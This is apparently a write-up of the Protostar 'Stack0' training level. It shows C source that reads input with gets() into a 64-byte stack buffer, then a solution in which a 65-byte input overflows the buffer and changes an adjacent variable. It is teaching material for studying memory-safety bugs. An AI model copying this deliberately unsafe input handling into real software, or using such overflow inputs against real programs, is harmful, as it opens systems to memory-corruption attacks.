#### Stack0

###### About

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at ``/opt/protostar/bin/stack0``

``stack0.c``

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

###### Solution

```sh
user@protostar:/opt/protostar/bin$ ./stack0
aaaaaa
Try again?
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'A'*63" | ./stack0
Try again?
user@protostar:/opt/protostar/bin$
user@protostar:/opt/protostar/bin$ python -c "print 'A'*64" | ./stack0
Try again?
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ python -c "print 'A'*65" | ./stack0
you have changed the 'modified' variable
user@protostar:/opt/protostar/bin$
```